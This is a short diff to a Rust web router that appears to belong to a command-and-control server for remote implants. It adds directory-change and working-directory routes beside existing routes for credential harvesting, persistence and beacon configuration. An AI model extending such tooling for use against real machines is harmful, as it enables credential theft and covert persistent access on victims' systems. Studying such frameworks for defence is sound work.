@@ -41,6 +41,8 @@ pub fn create_api_router(state: Arc<ApiState>) -> Router {
         .route("/api/agents/:id/download", post(handlers::download_file))
         .route("/api/agents/:id/upload", post(handlers::upload_file))
         .route("/api/agents/:id/listdir", post(handlers::list_directory))
+        .route("/api/agents/:id/cd", post(handlers::change_directory))
+        .route("/api/agents/:id/pwd", post(handlers::get_cwd))
         .route("/api/agents/:id/harvest", post(handlers::harvest_credentials))
         .route("/api/agents/:id/persist", post(handlers::set_persistence))
         .route("/api/agents/:id/beacon", post(handlers::configure_beacon))
